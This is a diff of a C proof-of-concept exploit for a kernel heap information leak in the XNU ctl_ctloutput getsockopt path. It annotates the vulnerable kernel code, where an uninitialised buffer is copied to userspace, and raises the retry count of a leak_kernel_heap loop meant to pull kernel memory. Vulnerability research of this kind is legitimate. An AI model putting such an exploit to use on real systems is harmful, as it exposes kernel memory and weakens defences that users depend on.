@@ -45,23 +45,23 @@
  */
 #if 0
 	if (sopt->sopt_valsize && sopt->sopt_val) {
-		MALLOC(data, void *, sopt->sopt_valsize, M_TEMP,	(a) data is allocated
-			M_WAITOK);					    without M_ZERO.
+		MALLOC(data, void *, sopt->sopt_valsize, M_TEMP,	// (a) data is allocated
+			M_WAITOK);					//     without M_ZERO.
 		if (data == NULL)
 			return (ENOMEM);
 		/*
 		 * 4108337 - copy user data in case the
 		 * kernel control needs it
 		 */
-		error = sooptcopyin(sopt, data,				(b) sooptcopyin() is called
-			sopt->sopt_valsize, sopt->sopt_valsize);	    to fill the buffer;
-	}								    return value ignored.
-	len = sopt->sopt_valsize;
+		error = sooptcopyin(sopt, data,				// (b) sooptcopyin() is
+			sopt->sopt_valsize, sopt->sopt_valsize);	//     called to fill the
+	}								//     buffer; the return
+	len = sopt->sopt_valsize;					//     value is ignored.
 	socket_unlock(so, 0);
-	error = (*kctl->getopt)(kctl->kctlref, kcb->unit,		(c) getsockopt()
-			kcb->userdata, sopt->sopt_name,			    implementation called
-				data, &len);				    to process the buffer.
-	if (data != NULL && len > sopt->sopt_valsize)
+	error = (*kctl->getopt)(kctl->kctlref, kcb->unit,		// (c) The getsockopt()
+			kcb->userdata, sopt->sopt_name,			//     implementation is
+				data, &len);				//     called to process
+	if (data != NULL && len > sopt->sopt_valsize)			//     the buffer.
 		panic_plain("ctl_ctloutput: ctl %s returned "
 			"len (%lu) > sopt_valsize (%lu)\n",
 				kcb->kctl->name, len,
@@ -69,10 +69,10 @@
 	socket_lock(so, 0);
 	if (error == 0) {
 		if (data != NULL)
-			error = sooptcopyout(sopt, data, len);		(d) If (c) succeeded, then
-		else							    the data buffer is
-			sopt->sopt_valsize = len;			    copied out to
-	}								    userspace.
+			error = sooptcopyout(sopt, data, len);		// (d) If (c) succeeded,
+		else							//     then the data buffer
+			sopt->sopt_valsize = len;			//     is copied out to
+	}								//     userspace.
 #endif
 
 #include <errno.h>
@@ -393,7 +393,7 @@ int main(int argc, const char *argv[]) {
 		return 1;
 	}
 	// Try to leak interesting data from the kernel.
-	const size_t MAX_TRIES = 10000;
+	const size_t MAX_TRIES = 50000;
 	__block size_t try = 1;
 	__block bool leaked = false;
 	bool success = leak_kernel_heap(leak_size, ^bool (const void *leak, size_t size) {
